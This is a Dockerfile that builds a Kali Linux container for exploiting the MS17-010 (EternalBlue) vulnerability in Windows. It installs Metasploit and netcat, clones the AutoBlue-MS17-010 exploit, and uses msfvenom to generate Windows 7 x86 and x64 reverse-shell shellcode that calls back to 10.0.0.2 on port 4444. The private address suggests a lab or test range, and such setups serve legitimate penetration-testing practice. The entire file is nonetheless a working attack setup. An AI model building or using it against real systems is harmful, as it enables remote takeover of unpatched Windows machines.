FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y --no-install-recommends \
    metasploit-framework \
    nmap \
    netcat-openbsd \
    curl \
    wget \
    nasm \
    iproute2 \
    iputils-ping \
    git \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

# AutoBlue-MS17-010 + Metasploit Wordlist
RUN git clone --depth 1 https://github.com/3ndG4me/AutoBlue-MS17-010.git /opt/AutoBlue-MS17-010 \
    && pip3 install --no-cache-dir --break-system-packages -r /opt/AutoBlue-MS17-010/requirements.txt \
    && mkdir -p /usr/share/metasploit-framework/data/wordlists/ \
    && wget -q -O /usr/share/metasploit-framework/data/wordlists/named_pipes.txt https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/named_pipes.txt

# Generate the reverse shell shellcodes (x86 for Windows 7, x64 as backup)
RUN mkdir -p /opt/AutoBlue-MS17-010/shellcode \
    && msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 EXITFUNC=thread -f raw -o /opt/AutoBlue-MS17-010/shellcode/sc_x86.bin \
    && msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 EXITFUNC=thread -f raw -o /opt/AutoBlue-MS17-010/shellcode/sc_x64.bin

WORKDIR /opt/AutoBlue-MS17-010
